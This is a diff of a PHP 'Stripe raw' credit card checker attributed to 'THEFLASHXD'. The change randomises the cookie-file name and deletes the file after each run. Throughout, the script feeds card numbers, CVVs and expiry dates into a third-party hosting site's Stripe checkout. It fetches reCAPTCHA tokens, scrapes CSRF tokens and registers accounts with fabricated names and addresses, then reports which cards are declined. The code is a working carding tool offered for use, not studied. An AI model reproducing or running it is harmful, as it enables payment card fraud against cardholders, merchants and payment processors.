@@ -10,8 +10,8 @@ $userId = $_SESSION["user_id"];
 ##################### STRIPE RAW BY THEFLASHXD ###########################
 error_reporting(0);
 date_default_timezone_set('Asia/Jakarta');
-
-@unlink('cookie.txt');
+$abcd = rand(111,999);
+@unlink(''.$abcd.'cookie.txt');
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     extract($_POST);
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
@@ -92,8 +92,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/anchor?ar=1
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
     'Pragma: no-cache',
@@ -122,8 +122,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/reload?k=6L
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
     'Pragma: no-cache',
@@ -157,8 +157,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
 $curl = curl_exec($ch);
 curl_close($ch);
 $csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
@@ -176,8 +176,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'ajax=1&a=confproduct&configure=true&i=0&billingcycle=monthly&configoption%5B5%5D=35');
 $curl = curl_exec($ch);
 curl_close($ch);
@@ -195,8 +195,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
 $curl = curl_exec($ch);
 curl_close($ch);
 $csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
@@ -215,8 +215,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b71e6727-e215-4321-86fb-e144ff1cf5e4dc561f&muid=d1638923-e02b-4a44-abc0-c8e01fb894231f42ed&sid=2d7debf7-2894-48af-9372-4f9a207f57ed2ddb02&pasted_fields=number&payment_user_agent=stripe.js%2Fd16ff171ee%3B+stripe-js-v3%2Fd16ff171ee%3B+split-card-element&referrer=https%3A%2F%2Fhosting.rebsdesigns.com&time_on_page=85960&key='.$pi.'');
 $curl = curl_exec($ch);
 curl_close($ch);
@@ -224,6 +224,7 @@ $id = trim(strip_tags(getStr($curl, '"id": "', '"')));
 $ms = trim(strip_tags(getStr($curl, 'message": "', '"')));
 if (empty($id)) {
     echo '#Declined '.$ip.'「Declined : '.$ms.' : @luffy_dxD」';
+    @unlink(''.$abcd.'cookie.txt');
     die();
 }
 #########################################################
@@ -239,8 +240,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'token='.$csf.'&custtype=new&loginemail=&loginpassword=&firstname='.$first.'&lastname='.$last.'&email='.urlencode($email).'&country-calling-code-phonenumber=1&phonenumber=2042456&companyname=&address1=15+Cliff+Street&address2=&city=New+York&state=New+York&postcode=10038&country=US&password=oX%7D*OMs(lN!%7D&password2=oX%7D*OMs(lN!%7D&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&marketingoptin=1&g-recaptcha-response='.$body.'&payment_method_id='.$id.'');
 $curl = curl_exec($ch);
 curl_close($ch);
@@ -263,7 +264,7 @@ if(strpos($curl, 'Your card has insufficient funds.')){
     echo '#Declined '.$ip.'「Declined : '.$error.' : @luffy_dxD」';
     }
     
-
+    @unlink(''.$abcd.'cookie.txt');
 
 
 
